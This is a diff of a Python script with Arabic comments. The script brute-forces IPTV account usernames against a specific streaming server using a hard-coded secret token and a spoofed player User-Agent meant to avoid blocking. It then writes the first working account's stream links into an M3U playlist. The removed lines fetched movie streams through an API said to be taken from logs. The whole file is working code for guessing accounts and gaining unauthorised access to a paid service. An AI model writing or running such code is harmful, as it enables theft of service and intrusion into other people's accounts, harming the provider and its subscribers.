@@ -3,17 +3,19 @@ import requests
 # إعدادات السيرفر والمعلومات الثابتة
 SERVER = "http://vipwettbornwet.top:8080"
 TOKEN_SECRET = "1260f37e4c58"
-CHANNELS = ["37642", "37643", "37644"] # القنوات الأفغانية المباشرة
+CHANNELS = ["37642", "37643", "37644"] # القنوات الأفغانية
 
-# إعداد الهيدر لتبدو كأنك مشغل IPTV حقيقي
+# إعداد الهيدر لتبدو كأنك مشغل IPTV حقيقي (تجنب الحظر)
 HEADERS = {
     'User-Agent': 'IPTVSmartersPlayer',
     'Accept': '*/*'
 }
 
 def check_account(user):
+    # نختبر القناة الأولى فقط للتأكد من أن الحساب شغال
     url = f"{SERVER}/{user}/{TOKEN_SECRET}/{CHANNELS[0]}"
     try:
+        # نستخدم HEAD ليكون الطلب خفيفاً وسريعاً
         response = requests.head(url, headers=HEADERS, timeout=3, allow_redirects=True)
         if response.status_code == 200:
             return True
@@ -21,53 +23,28 @@ def check_account(user):
         pass
     return False
 
-def get_movie_stream(user, movie_id):
-    """جلب رابط الفيلم بناءً على الـ ID المستخرج من اللوغات"""
-    # نستخدم نفس منطق الـ API اللي استخرجته أنت
-    api_url = f"{SERVER}/api/android/transcoddedFiles/id/{movie_id}?username={user}&password={TOKEN_SECRET}"
-    try:
-        res = requests.get(api_url, headers=HEADERS, timeout=5).json()
-        # نأخذ رابط الـ m3u8 المباشر
-        return res[0]['videoUrl']
-    except:
-        return f"{SERVER}/movie/{user}/{TOKEN_SECRET}/{movie_id}.mp4" # رابط احتياطي
-
 def update_m3u_file(working_user):
-    # بيانات الفيلم الجديد الذي استخرجناه من الـ JSON
-    movie_id = "139908" 
-    movie_name = "Ambush In The Slim Brunette"
-    # يمكنك وضع أي رابط لوغو هنا أو تركه فارغاً
-    movie_logo = "https://image.tmdb.org/t/p/w600_and_h900_bestv2/7fXCjOjGrOLmjGaqxUMbmsqMuA8.jpg" 
-    
     with open("playlist.m3u", "w", encoding="utf-8") as f:
         f.write("#EXTM3U\n")
-        
-        # قسم القنوات المباشرة (Live)
-        f.write("\n#--- LIVE TV ---\n")
+        # توليد الروابط لجميع القنوات باستخدام اليوزر الشغال
         for ch in CHANNELS:
-            f.write(f'#EXTINF:-1 tvg-id="AFG_{ch}" group-title="AFGHAN LIVE", AFG CHANNEL {ch}\n')
+            f.write(f'#EXTINF:-1 tvg-id="AFG_{ch}" tvg-name="AFG CHANNEL {ch}", AFG CHANNEL {ch}\n')
             f.write(f"{SERVER}/{working_user}/{TOKEN_SECRET}/{ch}.ts\n")
-            
-        # قسم الأفلام بالتنسيق الذي طلبته (VOD)
-        f.write("\n#--- SERVER MOVIES ---\n")
-        # السطر الأول: معلومات الفيلم، اللوغو، والمجموعة
-        f.write(f'#EXTINF:-1 tvg-id="" tvg-name="{movie_name}" tvg-logo="{movie_logo}" group-title="MOVIES | Adult",{movie_name}\n')
-        # السطر الثاني: الرابط المباشر بالـ ID الجديد والامتداد mkv
-        f.write(f"{SERVER}/movie/{working_user}/{TOKEN_SECRET}/{movie_id}.mkv\n")
+    print(f"✅ تم بنجاح! اليوزر الشغال هو: {working_user}")
 
-    print(f"✅ تم تحديث الفيلم بالـ ID الجديد: {movie_id} وبالتنسيق المطلوب")
 def start_fuzzing():
     print("🚀 جاري بدء عملية الفحص وتخمين الحسابات...")
-    for i in range(100, 999):
+    # النطاق الذي حددته أنت (300 إلى 500)
+    for i in range(300, 501):
         target_user = f"VIP016471744476160{i}"
         print(f"🔎 فحص الحساب: {target_user}", end="\r")
         
         if check_account(target_user):
             print(f"\n✨ وجدته! حساب فعال: {target_user}")
             update_m3u_file(target_user)
-            return 
+            return # نتوقف عند أول حساب شغال لتوفير الوقت والجهد
             
-    print("\n❌ لم يتم العثور على حساب فعال.")
+    print("\n❌ للأسف لم يتم العثور على حساب شغال في هذا النطاق.")
 
 if __name__ == "__main__":
     start_fuzzing()
